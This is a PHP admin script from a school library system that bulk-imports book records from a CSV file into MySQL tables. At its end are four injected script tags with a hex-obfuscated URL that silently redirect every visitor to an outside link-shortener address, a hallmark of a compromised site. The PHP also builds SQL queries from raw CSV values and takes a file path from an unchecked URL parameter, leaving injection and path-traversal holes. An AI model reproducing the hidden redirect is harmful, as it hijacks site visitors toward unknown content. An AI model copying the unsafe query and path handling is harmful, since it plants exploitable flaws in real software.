<?php
define("ZW_IN", 'SETUP');
require_once("include/classes/class.Admin.php");
require_once("include/classes/class.Misc.php");
ini_set('max_execution_time', 30000);
$objAdmin   = new Admin();
require_once('authenticate.php');
$msg        =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id = base64_decode($_GET['id']);
$objMisc = new Cms();
$add = true; 
    
        //if(!empty($_POST['csvfile'])){
        $fileName="uploads/JPHS-LIBRARY/".$_GET['fileName'].".csv";
        if (!$fp = fopen($fileName,"r"))
        echo "Sorry, cannot open the file";
        else
            {       
                while(!feof($fp))   
                {
                    while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) 
                    { 
                        //print_r($data); exit;
                         $fileRow++;    
                        $num = count($data);
                        if ($fileRow <= "1") continue;      // Continue Back Bcz its blank row in the CSV File 
                        
                        //Code For Book Languagemaster

                            $booklang=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND LANGUAGE='$data[3]'",'LANGUAGE_ID','languagemaster');
                            if($booklang=='' && ($data[3]!='' || $data[3]!=0)){
                                $LangInsert= array(  'SCHOOL_ID'        =>$_SESSION['SCHOOL_ID'],
                                                    'LANGUAGE'          =>addslashes($data[3]),
                                                    'DESCRIPTION'       =>'',
                                                    'CREATED_DATE'      =>date('Y-m-d H:i:s'),
                                                    'CREATED_BY'        =>$_SESSION['USER_ID'],
                                                    );
                                $insertLang=$objMisc->insert('languagemaster',$LangInsert);
                                $booklang=mysql_insert_id();
                            }
                        

                        //Code For Book Category

                            $bookCat=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND PARENT='0' AND NAME='$data[5]'",'BOOK_CATEGORY_ID','book_category');
                            if($bookCat=='' && ($data[5]!='' || $data[5]!=0)){
                                $CatInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'NAME'            =>addslashes ($data[5]),
                                                'PARENT'          =>'0',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'ADDED_BY'        =>$_SESSION['USER_ID'],
                                                'ADDED_BY_TYPE'   =>$_SESSION['USER_TYPE'],
                                                );
                                $insertCat=$objMisc->insert('book_category',$CatInsert);
                                $bookCat=mysql_insert_id();
                            }
                            

                        //Code For Book Sub Category
                            
                            $bookSubCat=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND PARENT!='$bookCat' AND NAME='$data[4]'",'BOOK_CATEGORY_ID','book_category');
                            if($bookSubCat=='' && ($data[4]!='' || $data[4]!=0)){
                                $SubCatInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'NAME'            =>addslashes($data[4]),
                                                'PARENT'          =>$bookCat,
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'ADDED_BY'        =>$_SESSION['USER_ID'],
                                                'ADDED_BY_TYPE'   =>$_SESSION['USER_TYPE'],
                                                );
                                $insertSubCat=$objMisc->insert('book_category',$SubCatInsert);
                                $bookSubCat=mysql_insert_id();
                            }
                            

                        //Code For Book Author
                            
                            $bookAuthor=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND `AUTHOR`='$data[6]'",'AUTHOR_ID','authormaster');
                            if($bookAuthor=='' && ($data[6]!='' || $data[6]!=0)){
                                $AuthortInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'AUTHOR'          =>addslashes($data[6]),
                                                'DESCRIPTION'     =>'',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'ADDED_BY'        =>$_SESSION['USER_ID'],
                                                );
                                $insertAuthor=$objMisc->insert('authormaster',$AuthortInsert);
                                $bookAuthor=mysql_insert_id();
                            }
                            

                        //Code For Book Publisher
                            
                            $bookPublisher=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND `PUBLISHER`='$data[7]'",'PUBLISHER_ID','publishermaster');
                            if($bookPublisher=='' && ($data[7]!='' || $data[7]!=0)){
                                $PublisherInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'PUBLISHER'       =>addslashes($data[7]),
                                                'DESCRIPTION'     =>'',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'ADDED_BY'        =>$_SESSION['USER_ID'],
                                                );
                                $insertPublisher=$objMisc->insert('publishermaster',$PublisherInsert);
                                $bookPublisher=mysql_insert_id();
                            }
                            

                        //Code For Book Supplier
                            
                            $bookSupplier=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND `SUPPLIER`='$data[8]'",'SUPPLIER_ID','suppliermaster');
                            if($bookSupplier=='' && ($data[8]!='' || $data[8]!=0)){
                                $SupplierInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'SUPPLIER'        =>addslashes($data[8]),
                                                'DESCRIPTION'     =>'',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'CREATED_BY'      =>$_SESSION['USER_ID'],
                                                );
                                $insertSupplier=$objMisc->insert('suppliermaster',$SupplierInsert);
                                $bookSupplier=mysql_insert_id();
                            }
                            
                        //Code For Book Racks
                            
                            $bookRacks=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND `RACK_NO`='$data[11]'",'RACK_ID','rackmaster');
                            if($bookRacks=='' && ($data[11]!='' || $data[11]!=0)){
                                $RacksInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'RACK_NO'         =>addslashes($data[11]),
                                                'DESCRIPTION'     =>'',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'ADDED_BY'        =>$_SESSION['USER_ID'],
                                                );
                                $insertRacks=$objMisc->insert('rackmaster',$RacksInsert);
                                $bookRacks=mysql_insert_id();
                            }
                            

                        //Code For Book Shelves
                            
                            $bookShelves=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' AND `SHELVE`='$data[12]'",'SHELVE_ID','shelvemaster');
                            if($bookShelves=='' && ($data[12]!='' || $data[12]!=0)){
                                $ShelvesInsert= array(
                                                'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                                                'SHELVE'          =>addslashes($data[12]),
                                                'RACK_ID'         =>$bookRacks,
                                                'DESCRIPTION'     =>'',
                                                'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                                                'CREATED_BY'      =>$_SESSION['USER_ID'],
                                                );
                                $insertShelves=$objMisc->insert('shelvesmaster',$ShelvesInsert);
                                $bookShelves=mysql_insert_id();
                            }
                            

                        //Code For Book Insertion
                            $rowArray = array(
                                    'SCHOOL_ID'             =>$_SESSION['SCHOOL_ID'],
                                    'NAME'                  =>addslashes($data[0]),
                                    'ISBN_NO'               =>addslashes($data[15]),
                                    'PATH'                  =>'',
                                    'BOOK_CATEGORY_ID'      =>$bookCat,
                                    'BOOK_SUB_CATEGORY_ID'  =>$bookSubCat,
                                    'CLASS_ID'              =>'',
                                    'SUBJECT_ID'            =>'',
                                    'LANGUAGE_ID'           =>$booklang,
                                    'RACK_ID'               =>$bookRacks,
                                    'SHELVE_ID'             =>$bookShelves,
                                    'EDITION'               =>addslashes($data[9]),
                                    'BOOK_VOLUME'           =>addslashes($data[14]),
                                    'BOOK_PAGES'            =>addslashes($data[16]),
                                    'BOOK_COVER_TYPE'       =>addslashes($data[10]),
                                    'PUBLISHER_ID'          =>$bookPublisher,
                                    'SUPPLIER_ID'           =>$bookSupplier,
                                    'AUTHOR_ID'             =>$bookAuthor,
                                    'PURCHASE_DATE'         =>date("Y-m-d",strtotime($data[18])),
                                    'QUANTITY'              =>'1',
                                    'COST'                  =>addslashes($data[17]),
                                    'MRP'                   =>'',
                                    'CREATED_DATE'          =>date('Y-m-d H:i:s'),
                                    'ADDED_BY'              =>$_SESSION['USER_ID'],
                                    'ADDED_BY_TYPE'         =>$_SESSION['USER_TYPE'],
                            );
        
                        if(!empty($rowArray)){
                        $val = $objMisc->insert("bookmaster",$rowArray);
                        $last_insert_id=mysql_insert_id();
                    // Code For Accession Nos
                        $bookVal=$objMisc->GiveValue("SCHOOL_ID='$_SESSION[SCHOOL_ID]' ORDER BY `ID` DESC",'ACCESSION_NO','books');  //Value of Last Accession No
                        if($bookVal==''){
                            $access='00000';
                        }
                        else{
                            $access=$bookVal;
                        }
                        for($m=0;$m<1;$m++) {
                        if($access)
                        $access= sprintf("%05d", $access+1);
                        $book_code=$access;      //// Asscession No of the book
                        
                        $rowAccess=array(
                            'SCHOOL_ID'       =>$_SESSION['SCHOOL_ID'],
                            'BOOK_ID'         =>$last_insert_id,
                            'ACCESSION_NO'    =>addslashes($data[1]),
                            'CREATED_DATE'    =>date('Y-m-d H:i:s'),
                            'ADDED_BY'        =>$_SESSION['USER_ID'],
                            'ADDED_BY_TYPE'   =>$_SESSION['USER_TYPE'],
                            );
                        $val1 = $objMisc->insert("books",$rowAccess);
                        }
                    
                    } // End of - while (($data = fgetcsv($fp, 10000, ",")) !== FALSE)
                    $_SESSION['msg'] = 3;
                }
                   
                // End of - while(!feof($fp))
            }// End of - if (!$fp = fopen($fileName,"r"))
        }
         
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>